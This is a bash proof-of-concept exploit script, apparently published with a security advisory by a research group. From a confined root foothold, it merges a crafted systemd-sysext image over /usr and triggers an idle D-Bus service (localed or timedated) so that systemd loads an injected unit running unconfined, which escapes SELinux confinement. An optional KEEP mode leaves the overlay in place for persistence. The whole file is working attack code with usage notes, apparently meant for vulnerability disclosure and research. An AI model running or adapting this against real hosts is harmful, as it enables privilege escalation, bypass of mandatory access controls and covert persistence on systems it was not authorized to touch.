#!/bin/bash
#
# LinnemanLabs - sysext PoC - overlay (on-target)
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# 
# sysext allow mounting a DDI system extension over /usr or /opt.
#
# run from a confined uid-0 foothold that can:
# -  create /run/extensions (if it does not exist already)
# -  reach the sysext varlink (systemd >= 255)
# -  reach D-Bus to ping an unloaded service
#
# this merges an image (built with sysext-build-image.sh) over /usr,
# then activates a service (by calling it's D-Bus interface) that has
# our overlaid .wants pointing at our crafted service unit. systemd
# loads the pivot, scans the .wants off the overlay, and pulls our
# unit -> it runs as unconfined_service_t.
#
# no daemon-reload, no Link/Enable, no writable unit dir, no service
# restart permissions required.
#
# VARS:
#   BLOB=/path/to/<NAME.b64 from sysext-build-image.sh> (or pass as $1)
#   PIVOTS="dbusname=unit ..."   cold services to try in order. default = locale1 + timedate1 on all tested distros
#                                must match what you chose when you built in sysext-build-image.sh or leave them default
#   OUT=<output log file>        default /run/linnemanlabs-poc.out. configured at image build time, this is to check for success
#   KEEP=1                       leave the overlay merged + image staged (default cleans up)
#
# example:
#   ./sysext-overlay.sh /var/lib/ipsec/nss/linnemanlabs-sysext-poc.b64
#
set -eu
BLOB="${BLOB:-${1:-$(ls -1 ./*.b64 2>/dev/null | head -1)}}"
OUT="${OUT:-/run/linnemanlabs-poc.out}"
# service to make depend on us. timedated and localed were on all distros i tested and idle-exit which unloads for re-use
PIVOTS="${PIVOTS:-org.freedesktop.locale1=systemd-localed.service org.freedesktop.timedate1=systemd-timedated.service}"
KEEP="${KEEP:-0}"
SD="org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager"

[ -n "${BLOB}" ] && [ -f "${BLOB}" ] || { echo "[-] no image blob - set BLOB=<NAME>.b64 (from sysext-build-image.sh)"; exit 1; }
command -v varlinkctl >/dev/null 2>&1 || { echo "[-] varlinkctl missing - sysext varlink needs systemd >= 255"; exit 1; }

# systemd matches the .raw basename to the image's extension-release.<name> marker, so the staged
# raw must keep the builder's basename minus .b64, or it errors with "Failed to read metadata".
RAWNAME="$( basename "${BLOB}" .b64 )"
RAW="/run/extensions/${RAWNAME}.raw"

# GetUnit returns an object path if the unit is loaded, otherwise returns 'not loaded' and
# does not load it. systemctl status/show/cat/etc load it which defeats the purpose of our check.
is_cold(){ busctl call ${SD} GetUnit s "$1" 2>&1 | grep -q 'not loaded'; }

MERGED=0
cleanup(){
  if [ "${KEEP}" = 1 ]; then echo "[*] KEEP=1 - leaving /usr overlay merged + image staged (persistence)"; return; fi
  if [ "${MERGED}" = 1 ]; then
    varlinkctl call /run/systemd/io.systemd.sysext io.systemd.sysext.Unmerge '{}' >/dev/null 2>&1 \
      || systemd-sysext unmerge >/dev/null 2>&1 || true
    echo "[*] cleanup: unmerged /usr overlay"
  fi
  rm -f "${RAW}" 2>/dev/null || true
}
trap cleanup EXIT

# create the search dir if it does not exist already. ensure your domain can create it, largest hurdle to this technique
if [[ ! -d /run/extensions ]];then
  mkdir -p /run/extensions || { echo "[-] cannot create /run/extensions from this domain"; exit 1; }
fi

# stage the image. both binaries are bin_t same as varlinkctl
base64 -d "${BLOB}" | gzip -dc > "${RAW}"
echo "[*] staged ${RAW}"

# merge with no MAC check - overlays our injected unit + its .wants onto /usr, no daemon-reload
varlinkctl call /run/systemd/io.systemd.sysext io.systemd.sysext.Merge '{}' >/dev/null
MERGED=1
echo "[+] merged - /usr now has our unit and the .wants -> us"

# activate the first cold pivot service. loading it scans the overlaid .wants and pulls our unit
rm -f "${OUT}" || { echo "[-] failed to remove existing output log - probably not a label we can delete, log may not be reliable. check timestamp on log file"; true; }
FIRED=""
for pair in ${PIVOTS}; do
  BUS="${pair%%=*}"; UNIT="${pair##*=}"
  if is_cold "${UNIT}"; then
    echo "[*] ${UNIT} is cold - activating ${BUS} to pull our unit"
    busctl call "${BUS}" / org.freedesktop.DBus.Peer Ping >/dev/null 2>&1 || true
    FIRED="${UNIT}"; break
  fi
  echo "[-] ${UNIT} is loaded - skipping (it should idle-exit + GC back)"
done
[ -n "${FIRED}" ] || { echo "[-] no cold pivot service found - retry after idle-exit (~30s) or add more to PIVOTS"; exit 1; }

sleep 2
if [ -f "${OUT}" ]; then
  echo "[+] fired via ${FIRED} - payload ran:"; sed 's/^/    /' "${OUT}"
else
  echo "[-] no output at ${OUT} yet - did you change output log location? check the folder from an unconfined domain and check logs"
fi
exit 0
